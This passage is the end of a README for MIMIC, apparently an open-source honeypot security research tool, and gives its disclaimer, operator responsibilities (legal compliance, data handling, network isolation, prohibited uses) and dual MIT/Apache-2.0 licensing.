> This software is provided **"as is"**, without warranty of any kind, express or implied. The authors and contributors are not responsible for any damage, data loss, security incidents, or legal consequences resulting from the use, misuse, or inability to use this software.

MIMIC is a security research tool. Deploying it carries legal and operational responsibilities that rest entirely with the operator:

1. **Legal compliance** — ensure your deployment complies with all applicable local, national, and international laws, including data protection legislation (e.g., GDPR), wiretapping/monitoring statutes, and computer crime laws.
2. **Data handling** — honeypots collect third-party data (IP addresses, credentials, uploaded files). You are responsible for lawful handling, appropriate retention policies, and any breach notification obligations.
3. **Network isolation** — deploy in a dedicated, isolated environment. Misconfiguration can expose adjacent infrastructure. The authors assume no liability if the honeypot is used as a pivot point.
4. **Prohibited uses** — this tool must not be used for unauthorised surveillance, entrapment, or any form of offensive cyber operations.
5. **No security guarantees** — MIMIC is designed with defence-in-depth principles, but no software is immune to unknown vulnerabilities. Layer additional controls (firewalls, VLANs, monitoring) around any production deployment.

---

## License

Licensed under either of [MIT](LICENSE-MIT) or [Apache-2.0](LICENSE-APACHE) at your option.
